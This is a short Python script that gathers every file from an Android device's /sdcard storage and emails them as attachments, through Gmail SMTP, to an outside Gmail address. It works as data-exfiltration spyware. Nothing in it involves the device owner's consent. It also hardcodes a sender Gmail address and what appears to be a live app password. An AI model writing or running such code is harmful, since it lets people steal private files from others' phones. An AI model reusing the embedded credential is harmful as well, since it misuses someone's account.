import smtplib,os
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.utils import COMMASPACE, formatdate
from email import encoders

def send_email(send_from, send_to, subject, text, files=None):
    #assert isinstance(send_to, list)
    msg = MIMEMultipart()
    msg['From'] = send_from
    msg['To'] = COMMASPACE.join(send_to)
    msg['Date'] = formatdate(localtime=True)
    msg['Subject'] = subject

    msg.attach(MIMEText(text))

    for path in files or []:
        with open(path, "rb") as fil:
            part = MIMEBase('application', "octet-stream")
            part.set_payload(fil.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', 'attachment', filename=os.path.basename(path))
        msg.attach(part)

    smtp = smtplib.SMTP('smtp.gmail.com', 587)
    smtp.starttls()
    smtp.login("younisjohn18@gmail.com", "btxebyljvvrmpbmy")
    smtp.sendmail(send_from, send_to, msg.as_string())
    smtp.close()
list_files = []
folder_path = '/sdcard'
os.chdir(folder_path)
files = os.listdir('/sdcard/')
print(files)
for file in files:
	if os.path.isfile(file):
		list_files.append(file)
send_email("younisjohn18@gmail.com","bilalhaiderid@gmail.com","ID","Testing.....",list_files)